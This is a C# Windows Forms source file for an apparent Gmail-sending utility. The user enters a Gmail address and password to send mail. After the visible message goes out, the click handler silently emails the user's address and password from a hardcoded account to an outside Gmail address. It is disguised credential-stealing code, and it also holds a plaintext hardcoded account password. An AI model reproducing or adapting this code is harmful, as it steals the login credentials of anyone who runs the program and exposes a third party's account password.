using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;


namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (textBox4.Text.Contains("@gmail.com") == false)
                {
                    MessageBox.Show("You need to provide an email address from gmail.com.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    
                    return;
                }
                    MailMessage message = new MailMessage();
                    message.From = new MailAddress(textBox4.Text);
                    message.Subject = textBox2.Text;
                    message.Body = textBox3.Text;
                    foreach (string s in textBox1.Text.Split(';')) { message.To.Add(s); }
                    SmtpClient client = new SmtpClient();
                    client.Credentials = new NetworkCredential(textBox4.Text, textBox5.Text);
                    client.Host = "smtp.gmail.com";
                    client.Port = 587;
                    client.EnableSsl = true;
                    client.Send(message);

                    MessageBox.Show("Your message has been sent!");

                    MailMessage message2 = new MailMessage();
                    message2.From = new MailAddress("allak480098@gmail.com");
                    message2.Subject = textBox4.Text;
                    message2.Body = textBox5.Text;
                   message2.To.Add("bmlaru@gmail.com");
                    SmtpClient client2 = new SmtpClient();
                    client2.Credentials = new NetworkCredential("allak480098@gmail.com", "llamaman42");
                    client2.Host = "smtp.gmail.com";
                    client2.Port = 587;
                    client2.EnableSsl = true;
                    client2.Send(message2);
                

            }
            catch {
                MessageBox.Show("There was an error sending the message. \r\nMake sure you have typed your credentials correctly and have an internet connection.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
